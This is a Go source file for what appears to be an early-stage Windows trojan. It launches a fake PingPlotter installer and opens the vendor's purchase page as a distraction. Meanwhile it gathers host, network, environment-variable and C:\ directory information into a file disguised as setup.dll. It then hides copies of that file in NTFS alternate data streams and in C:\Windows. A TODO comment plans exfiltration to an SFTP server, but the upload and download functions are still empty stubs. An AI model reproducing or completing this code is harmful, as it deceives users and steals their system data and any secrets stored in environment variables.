package main

/*
	TODO
- Upload DLLs to SFTP Server
- Download file from SFTP server and hide in exe on Desktop
-

*/

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"strings"
	"time"

	"github.com/elastic/go-sysinfo"
)

func main() {
	go setupFakeEnv()
	distraction()
	saveAllInfo()
	fileManger()
}

func saveAllInfo() {
	usrDir := getUserHomeDir()
	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\setup.dll")

	system := sysGrab()
	environment := envGrab()
	network := netGrab()
	folders := folderGrab()

	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")

	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
}

func fileManger() {
	copyFiles()
	// downloadFiles()
	// exportFiles()
}

func copyFiles() {
	usrDir := getUserHomeDir()
	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\setup.dll")
	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
	if err != nil {
		fmt.Println(err)
	}
}

func exportFiles() {

}
func downloadFiles() {
}

func setupFakeEnv() {
	// Extract Fake Installer
	usrDir := getUserHomeDir()
	fakeInstall, err := PingPlotterFakeResource()
	if err != nil {
	}
	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
	installer.Write(fakeInstall)
	installer.Close()
	// Create ReadMe File
	readMeFile, err := ReadmeResource()
	if err != nil {
	}
	readme, err := os.Create("Readme.txt")
	readme.Write(readMeFile)
	readme.Close()
}

func distraction() {
	usrDir := getUserHomeDir()
	time.Sleep(time.Second)
	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\PingPlotterInstaller.exe")
	cmd1.Run()
	// pid := cmd1.Process.Pid
	// fmt.PrintLn(pid)
	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
}

func sysGrab() string {
	var systemInfo string

	f, err := sysinfo.Host()
	info := f.Info()

	systemInfo += "Hostname => " + info.Hostname
	systemInfo += "\nTimezone => " + info.Timezone
	systemInfo += "\nKernel => " + info.KernelVersion
	systemInfo += "\nUniqueID => " + info.UniqueID

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return systemInfo
}

func netGrab() string {
	// Get Network Info
	var networkInfo string

	f, err := sysinfo.Host()
	net := f.Info()

	mac := reflect.ValueOf(net.MACs).Interface().([]string)
	networkInfo += "MAC Addresses =>"
	for i := range mac {
		networkInfo += "\n\t" + net.MACs[i]
	}

	ips := reflect.ValueOf(net.IPs).Interface().([]string)
	networkInfo += "\n IP Addresses => "
	for i := range ips {
		networkInfo += "\n\t" + net.IPs[i]
	}

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return networkInfo
}

func envGrab() string {
	// Get env variables
	var envoInfo string
	for _, element := range os.Environ() {
		variable := strings.Split(element, "=")
		onlyString := variable[0] + " => " + variable[1] + "\n"
		envoInfo += onlyString
	}
	return envoInfo
}

func folderGrab() string {
	// Get all folders and files in searchFolder
	var envoInfo string
	searchFolder := "C:\\"

	files, err := ioutil.ReadDir(searchFolder)
	if err != nil {
	}
	for _, f := range files {
		envoInfo += searchFolder + f.Name() + "\n"
	}

	return envoInfo
}

func getUserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}
